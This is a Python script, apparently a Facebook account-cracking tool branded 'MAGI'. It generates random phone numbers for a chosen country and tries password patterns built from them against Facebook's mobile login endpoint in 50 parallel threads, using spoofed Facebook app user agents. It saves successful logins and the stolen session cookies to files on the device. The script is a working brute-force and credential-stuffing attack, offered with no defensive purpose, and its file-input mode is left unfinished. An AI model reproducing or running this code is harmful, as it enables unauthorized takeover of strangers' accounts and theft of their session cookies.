import os,time,random,string,requests,sys,re,uuid
from tqdm import tqdm
import phonenumbers as pn
from phonenumbers import geocoder
from phone_iso3166.country import *
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#os.system("pip install phone_iso3166")
#os.system("pip install phonenumbers")
v_er="Testing"
#=================[COLOR]================#
bl='\u001b[1;30m'
blb='\u001b[30m'
red='\u001b[1;31m'
gr='\u001b[1;32m'
ye='\u001b[1;33m'
blu='\u001b[1;34m'
ma='\u001b[1;35m'
cy='\u001b[1;36m'
wh='\u001b[1;37m'
br='\u001b[0;33m'
reset='\u001b[0m'
rb='\u001b[30;1m'
cc='\033[97;1m'
bgr='\u001b[32m'
clrs=['\u001b[1;31m','\u001b[1;32m','\u001b[1;33m','\u001b[1;34m','\u001b[1;35m','\u001b[1;36m','\u001b[1;37m','\u001b[0;33m','\u001b[30;1m','\u001b[32m']
x = random.choice(clrs)
#=================[COLOR]================#
loop = 0
cps = []
oks = []
Cookie = []
user=[]
#================[LOGO]==============#
simple=f"""
{cc}8b    d8    db     dP°°b8 88 × {red}{v_er}{reset}
{cc}88b  {ye}d88   dPYb{reset}   dP   `° 88
{cc}88YbdP88  dP__Yb  {cy}Yb  °88 88{reset}
{cc}88 YY 88 dP°°°°Yb  YboodP 88
{cy}─────────────────────────────────────────────{reset}
{ye}[×]{reset} {cc}Tool Owner  :  {bgr}MD SAYEM{reset}
{blu}[×]{reset} {cc}Tool Name   :  MAGI :){reset}
{cy}─────────────────────────────────────────────{reset}
[×] Dont Judge {red}Tool{reset} By Its Name !
{cy}─────────────────────────────────────────────{reset}"""

log=f"""{cc}8b    d8    db     dP°°b8 88 × {red}{v_er}{reset}
{cc}88b  {ye}d88   dPYb{reset}   dP   `° 88
{cc}88YbdP88  dP__Yb  {cy}Yb  °88 88{reset}
{cc}88 YY 88 dP°°°°Yb  YboodP 88
{cy}─────────────────────────────────────────────{reset}
{ye}[×]{reset} {cc}Tool Owner  :  {bgr}MD SAYEM{reset}
{blu}[×]{reset} {cc}Tool Name   :  MAGI :){reset}
{cy}─────────────────────────────────────────────{reset}
[×] Dont Judge {red}Tool{reset} By Its Name !
{cy}─────────────────────────────────────────────{reset}
{ye}[1]{cc} Crack file
{blu}[2]{cc} Crack random{reset}
{cy}─────────────────────────────────────────────{reset}"""
#=================[LOGO]===============#

def pas_wd():
	print(simple)
	hey=input("input password : ")
	if hey == '@Ntor':
		pass
	else:
		print("password incorrect")
		os.system('clear')
		return pas_wd()
def fuck_fuck():
    items = range(10)
    for item in tqdm(items, desc=x+ 'CHECKING' + reset, unit='item'):
        time.sleep(0.5)
#==============[STORAGE]===============#

#==============[STORAGE]===============#
def check_storage_permission():
    storage_directory = '/sdcard'

    if os.path.exists(storage_directory):
        fuck_fuck()
        pass
    else:
        print('Give storage access ')
        os.system('exit')
#==================[UA]=================#
def myua():
    phone_models = {
        "Samsung": [
            {"model": "SM-P610", "build": "P610XXS3FWD2"},
            {"model": "SM-T595", "build": "T595XXU4CVG4"},
            {"model": "SM-A107M", "build": "A107MUBS6CWD3"},
            {"model": "SM-A307GT", "build": "A307GTVJS5CWE2"},
            {"model": "SM-G991U", "build": "G991USQS8EWG1"},
            {"model": "SM-G985F", "build": "G985FXXSIHWGA"},
            {"model": "SM-N985F", "build": "N985FXXS7HWG1"},
            {"model": "SM-A515F", "build": "A515FXXU7HWF1"},
            {"model": "SM-A725F", "build": "A725FXXU6DWE3"},
            {"model": "SM-M315F", "build": "M315FXXU3CWA2"},
            {"model": "SM-F916U", "build": "F916USQS2JWE4"}],
        "Other": [
            {"model": "Pixel-5", "build": "G01234"},
            {"model": "iPhone-12", "build": "15A372"},
            {"model": "LG-G8", "build": "V20d"},
            {"model": "OnePlus-9", "build": "OP9XXU1ABC1"},
            {"model": "Xiaomi-Mi11", "build": "MI11XIU2BUC5"}
        ]
    }
    
    mobile_names = [
        "Galaxy", "Nova", "ZenFone", "Nexus", "Razor",
        "Xperia", "Moto", "Pixel", "Lumia", "Redmi"
    ]
    
    brand = random.choice(list(phone_models.keys()))
    model_data = random.choice(phone_models[brand])
    model_ = model_data["model"]
    build = model_data["build"]
    
    os_v = random.randint(4, 13)
    fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
    
    locales = [
        "en_US", "fr_FR", "es_ES", "de_DE", "it_IT",
        "pt_BR", "ru_RU", "zh_CN", "ja_JP"
    ]
    
    locale = random.choice(locales)
    mob = random.choice(mobile_names)
    
    ua = (
        '[FBAN/Orca-Android;FBAV/'
        + str(fbav)
        + ';FBPN/com.facebook.orca;FBLC/'
        + locale
        + ';FBBV/'
        + str(random.randint(111111111, 999999999))
        + ';FBCR/null;FBMF/'
        + mob.lower()
        + ';FBBD/'
        + mob.lower()
        + ';FBDV/'
        + str(model_)
        + '/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;]'
    )
    
    return ua

def R_Ua():
        samsung_models = [
            "SM-P610|P610XXS3FWD2",
            "SM-T595|T595XXU4CVG4",
            "SM-A107M|A107MUBS6CWD3",
            "SM-A307GT|A307GTVJS5CWE2",
            "SM-G991U|G991USQS8EWG1",
            "SM-G985F|G985FXXSIHWGA",
            "SM-N985F|N985FXXS7HWG1",
            "SM-A515F|A515FXXU7HWF1",
            "SM-A725F|A725FXXU6DWE3",
            "SM-M315F|M315FXXU3CWA2",
            "SM-F916U|F916USQS2JWE4",]
        model_,build = random.choice(samsung_models).rsplit('|')
        os_v = random.randint(4, 13)
        fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
        ua = ('[FBAN/Orca-Android;FBAV/'+str(fbav)+';FBPN/com.facebook.orca;FBLC/bn_BD;FBBV/'+str(random.randint(111111111,999999999))+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+str(model_)+'/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;]')
        return ua
#==================[UA]=================#
#=================[MENU]===============#
def menu():
	os.system('clear')
	check_storage_permission()
	pas_wd()
	os.system('clear')
	print(log)
	opt=input(cc+"Choose option : "+reset)
	if opt=='1':
		file()
		#os.system('exit')
	elif opt=='2':
		abbu()
	else :
		print(blu+'CHOOSE THE CORRECT OPTION FROM THE MENU'+reset)
		time.sleep(0.8)
		return menu()
#================[MENU]===============#

#=================[RND]================#
def abbu():
	user=[]
	os.system('clear');
	print(simple)
	print(ye+'[!]'+cc+' With Country Code'+reset)
	ir=input(blu+'[?]'+cc+' Input the full number of country :'+bgr)
	kmki=ir
	req="{}{}{}{}{}{}{}".format(*ir)
	cute=ir[7:]

	try:
		ir=pn.parse(ir)
		sort = phone_country(ir)
		pass
	except:
		#os.system('exit')
		print(cy+'─────────────────────────────────────────────'+reset);print(blu+'INPUT FULL NUMBER WITH  COUNTRY CODE'+blu);print(cy+'─────────────────────────────────────────────'+reset);time.sleep(0.9);return abbu()
	print(cy+'─────────────────────────────────────────────'+reset)
	print(ye+'[✓]'+cc+' Country Name Found : '+bgr+(geocoder.description_for_number(ir, "en"))+'('+sort+')')
	print(cy+'─────────────────────────────────────────────'+reset)
	print(blu+'[+]'+cc+' Example : 2000, 3000 ...'+reset)
	print(cy+'─────────────────────────────────────────────'+reset)
	limit=int(input(ye+"[?]"+cc+ "Limit : "+bgr))
	print(cy+'─────────────────────────────────────────────'+reset)
	for num in range(limit):
		nmp= ''.join(random.choice(string.digits) for _ in range(int(len(cute))))
		user.append(nmp)
	print(blu+'[+]'+cc+' EXAMPLE :  last6 , last 7 , last 8 , last9 , full'+reset)
	print(cy+'─────────────────────────────────────────────'+reset)
	pa_word=int(input(ye+'[+]'+cc+' How Many Password You Want To Enter : '+reset))
	print(cy+'─────────────────────────────────────────────'+reset)
	password=[]
	for cuda in range(pa_word):
		pw_enter=input(f"{blu}[{cuda+1}] {cc}password : {reset}")
		password.append(pw_enter)
	with ThreadPool(max_workers=50) as MAGI:
		tl=limit
		os.system("clear")
		print(simple)
		print(cc + '[' + red + '~' + cc + '] Number You Enter : ' + bgr + str(kmki))
		print(cc + '[' + red + '~' + cc + '] Total Accounts   : ' + bgr + str(tl))
		print(cc + '[' + red + '~' + cc + '] Airplane For Faster Speed')
		print(cy+'─────────────────────────────────────────────'+reset)
		for magi in user:
			uid = req + magi
			pwx = password
			MAGI.submit(rcrack1,uid,pwx)
#=================[RND]================#
wow=random.choice(['Dalvik/2.1.0 Linux; U; Android 10; Xiaomi 12T Build/RKQ1.698908.459) [FBAN/FB4A;FBAV/43.0.0.3645;FBBV/966032565;FBDM/{density=2.75,width=1080,height=2110};FBLC/ru_RU;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi 12T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]','Dalvik/2.1.0 Linux; U; Android 7; MI 8 SE Build/RKQ1.285663.381) [FBAN/FB4A;FBAV/51.0.0.1423;FBBV/297798746;FBDM/{density=2.75,width=1080,height=2110};FBLC/en_GB;FBCR/PTCL;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.adsmanager;FBDV/MI 8 SE;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'])
#=================[METHOD]================#
def rcrack1(uid, pwx):
    global loop, oks,cps
    noti= random.choice(['\033[31m','\033[32m','\033[33m','\033[34m','\033[35m','\033[36m'])
    sys.stdout.write(f'\r{cc}[<{noti}SAYEM{cc}>] <%s> × <{red}%s{cc}> × <{bgr}%s{cc}>'%(loop,len(cps),len(oks)))
    #print(pwx)
    sys.stdout.flush()
    loop+=1
    try:
        l6 = uid[-6:]
        l7 = uid[-7:]
        l8 = uid[-8:]
        l9 = uid[-9:]
        l10 = uid[-10:]
        l11 = uid[-11:]
        l12 = uid[-12:]
        full = uid

        for ps in pwx:
            pas = ps.replace('last6', l6).replace('last7', l7).replace('last8', l8).replace('last9', l9).replace('last10', l10).replace('last11', l11).replace('last12', l12).replace('full', full)
            session = requests.Session()
            Oinamamapiliz = session.get('https://x.facebook.com').text
            apple = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(Oinamamapiliz)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(Oinamamapiliz)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(Oinamamapiliz)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(Oinamamapiliz)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pas,
                "login": "Log In"
            }
            tedy = {
                'authority': 'x.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'path': '/login/device-based/regular/login/?refsrc',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': R_Ua()
            }
#Dalvik/2.1.0 (Linux; U; Android 9; 5 Build/QP1A.649039.377))[FBAN/FB4A;FBAV/44.0.0.1220;FBBV/6445461;[FBAN/Orca-Android;FBAV/196.0.0.92;FBPN/com.facebook.orca;FBLC/ar_SA;FBBV/272586331;FBCR/1O1Ocsl;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2477;FBSV/13.1.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1080,height=1280};FB_FW/1;FBRV/570217975;]            
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc', data=apple, headers=tedy).text
            acuda = session.cookies.get_dict().keys()
            
            if 'c_user' in acuda:
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki.split('c_user=')[1].split(';')[0]
            	if uid in oks:
            		pass
            	else:
                #coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                #cid = coki[7:22]
                	print(f'\r\r' + bgr + '[MAGI-OK] ' + cid +' | '+ pas)
                	print(bgr + '[BISCUITS] ' + cy + coki)
                #change here
                	open('/sdcard/MAGI-RANDOM-OK.txt', 'a').write(cid + '|' + pas + '\n')
                	open('/sdcard/MAGI-RANDOM-COOKIES-OK.txt', 'a').write(cid + '|' + pas + '|' + coki + '\n')
                	oks.append(uid)
                	break
            elif 'checkpoint' in acuda:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = uid
                open('/sdcard/MAGI-RANDOM-CP.txt', 'a').write(cid + '|' + pas + '\n')
                cps.append(uid)
                break
            else:
                continue
                #print(bgr + '[MAGI-OK]' + uid+' | ' + pas)
                #open('magi-ok.txt','a').write(uid + '|' + pas + '\n')  
        #loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
        
def file():
    pwx = []
    os.system('clear')
    print(simple)
    file_input = input(cc + "[-] Enter File: ")
    
    try:
        file_content = open(file_input, "r").read().splitlines()
        os.system('clear')
        print(simple)
        
        p_limit = int(input(cc + '[+] How Many Passwords You Want To Input : ' + red))
        print(cy + '─────────────────────────────────────────────' + reset)
        for x in range(p_limit):
            file_pass = input(cc + f'[{x+1}] Password : ')
            pwx.append(file_pass)
            
    except FileNotFoundError:
        print(blu + 'INPUT THE RIGHT PATH PLEASE!' + blu)
        print(cy + '─────────────────────────────────────────────' + reset)
        time.sleep(0.9)
        return file()
    
    os.system('clear')
    print(simple)
    print(cc + '[1] Method ')
    print(cc + '[2] Method ')
    methodin=input('[+] Choose : ')
    
    
menu()